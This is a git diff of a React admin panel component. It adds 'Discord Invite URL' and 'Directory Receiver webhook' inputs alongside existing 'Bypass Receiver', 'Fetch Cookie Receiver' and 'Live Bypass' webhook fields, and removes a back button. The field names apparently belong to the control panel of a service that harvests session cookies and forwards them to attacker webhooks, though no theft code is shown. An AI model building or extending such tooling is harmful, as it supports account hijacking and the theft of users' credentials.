@@ -1,6 +1,6 @@
 import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
-import { Shield, LogOut, ArrowLeft, Webhook, FolderPlus, Trash2, Link as LinkIcon, ChevronDown, ChevronUp, Plus } from "lucide-react";
+import { Shield, LogOut, Webhook, FolderPlus, Trash2, Link as LinkIcon, ChevronDown, ChevronUp, Plus } from "lucide-react";
 import {
   WK, getWebhook, setWebhook,
   Directory, getDirectories, addDirectory, deleteDirectory, notifyDirectoryCreated,
@@ -16,7 +16,7 @@ const AdminPanel = () => {
   const [invite, setInvite] = useState("");
   const [siteUrl, setSiteUrl] = useState("");
   const [dirs, setDirs] = useState<Directory[]>([]);
-  const [newDir, setNewDir] = useState({ name: "", bypassWebhook: "", fetchCookieWebhook: "", liveBypassWebhook: "" });
+  const [newDir, setNewDir] = useState({ name: "", bypassWebhook: "", fetchCookieWebhook: "", liveBypassWebhook: "", discordInviteUrl: "", directoryReceiver: "" });
   const [whOpen, setWhOpen] = useState(true);
   const [dirOpen, setDirOpen] = useState(true);
   const [addOpen, setAddOpen] = useState(false);
@@ -51,7 +51,7 @@ const AdminPanel = () => {
       liveBypassWebhook: newDir.liveBypassWebhook.trim(),
     });
     setDirs(getDirectories());
-    setNewDir({ name: "", bypassWebhook: "", fetchCookieWebhook: "", liveBypassWebhook: "" });
+    setNewDir({ name: "", bypassWebhook: "", fetchCookieWebhook: "", liveBypassWebhook: "", discordInviteUrl: "", directoryReceiver: "" });
     setAddOpen(false);
     toast.success("Directory created");
     notifyDirectoryCreated(d);
@@ -78,7 +78,6 @@ const AdminPanel = () => {
         {/* Header */}
         <div className="flex items-center justify-between">
           <div className="flex items-center gap-3">
-            <button onClick={() => navigate("/")} className="text-muted-foreground hover:text-foreground transition-colors p-1"><ArrowLeft size={20} /></button>
             <div className="w-9 h-9 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center glow-border">
               <Shield size={18} className="text-primary" />
             </div>
@@ -148,6 +147,8 @@ const AdminPanel = () => {
                   <input value={newDir.bypassWebhook} onChange={e => setNewDir({ ...newDir, bypassWebhook: e.target.value })} placeholder="Bypass Receiver webhook" className="input-field text-xs font-mono" />
                   <input value={newDir.fetchCookieWebhook} onChange={e => setNewDir({ ...newDir, fetchCookieWebhook: e.target.value })} placeholder="Fetch Cookie Receiver webhook" className="input-field text-xs font-mono" />
                   <input value={newDir.liveBypassWebhook} onChange={e => setNewDir({ ...newDir, liveBypassWebhook: e.target.value })} placeholder="Live Bypass webhook" className="input-field text-xs font-mono" />
+                  <input value={newDir.discordInviteUrl} onChange={e => setNewDir({ ...newDir, discordInviteUrl: e.target.value })} placeholder="Discord Invite URL" className="input-field text-xs font-mono" />
+                  <input value={newDir.directoryReceiver} onChange={e => setNewDir({ ...newDir, directoryReceiver: e.target.value })} placeholder="Directory Receiver webhook" className="input-field text-xs font-mono" />
                   <div className="flex gap-2">
                     <button onClick={handleAddDir} className="flex-1 bg-primary text-primary-foreground py-2 rounded-lg text-sm font-medium">Create</button>
                     <button onClick={() => setAddOpen(false)} className="flex-1 bg-secondary py-2 rounded-lg text-sm font-medium text-foreground">Cancel</button>
